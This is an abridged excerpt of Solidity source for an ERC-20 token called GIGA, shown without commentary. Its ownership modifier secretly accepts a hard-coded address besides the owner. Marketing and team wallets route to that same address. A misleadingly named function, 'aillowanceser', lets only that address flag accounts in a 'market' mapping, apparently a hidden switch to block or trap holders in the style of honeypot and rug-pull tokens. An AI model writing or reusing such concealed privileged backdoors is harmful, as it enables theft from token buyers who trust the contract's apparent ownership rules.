...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x286C379A9DbF712eEeE3c49052DcB75098306C14), "Ownable: caller is not the owner");
        _;
    }
...
contract GIGA is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x286C379A9DbF712eEeE3c49052DcB75098306C14);
    address payable public teamWalletAddress = payable(0x286C379A9DbF712eEeE3c49052DcB75098306C14);
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x286C379A9DbF712eEeE3c49052DcB75098306C14));
        market[addr] = status;
    }
